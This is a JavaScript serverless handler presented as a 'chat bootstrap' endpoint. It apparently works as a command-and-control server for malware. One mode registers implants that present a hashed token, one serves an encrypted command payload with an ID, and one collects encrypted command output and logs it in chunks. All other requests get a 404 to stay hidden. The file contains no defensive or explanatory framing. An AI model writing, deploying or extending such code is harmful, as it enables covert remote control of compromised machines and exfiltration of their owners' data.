import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '43';
const CONTROL_PAYLOAD = 'U2FsdGVkX1+s/OTJhOw8ZV4js2cKLyxD2ydsl8R3p8Z2trtGr8SVdsUbCrDZTSMRoA/H6w84kkFEmxOdZbFb+rJ2caE+NL9CBj7uAUhJF/MbgHzENnCU0PMHaFPFtsjZArJgxdI+BpQl9HGHqeTsmV3NMD7ZfJ8we3pbGCwrAAqbmfcPcDVlr6B9qgF/0GeGz/O9d3CKjirUbst2YG9muxPO1aYy+vuYEynohqAie5CIpDOuq/KIjuys+sxh60ft52fxKA8sWFICeHpW2UY/8vw2fZHDWeX80fI+BV5nfZhlIywwUFC1FVCvsbTl/30KR6Ymj8OIH2pEeX+Nc83uXSrHcn7GWwmpKifjBWRCVIAPkJxjwkY48WrNq8ocFZqYYJxUqr5Jo5qzbZS/Xuiv+A3OIXZFlDm0yxDzR62pUY0i7Bwsll57eb+/iQC+M2bUKWE4njJIkRqTzDFxGaGsiuVtZLYBaLBZiilVOnD+YJmrLVL5S5txko6SpV92Pw/OaHlc17HZbURpEaiRFcnplqM8q90v0WgDFJbaeil0RMSWKa8vh2baIqQWsRAnzLrIlFbhRV14yduGWnevGmIrDzkwPraYH1UbVLkBlQoSYF3V4haTmOVVPntcn8/43H/c';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}
function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}
export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
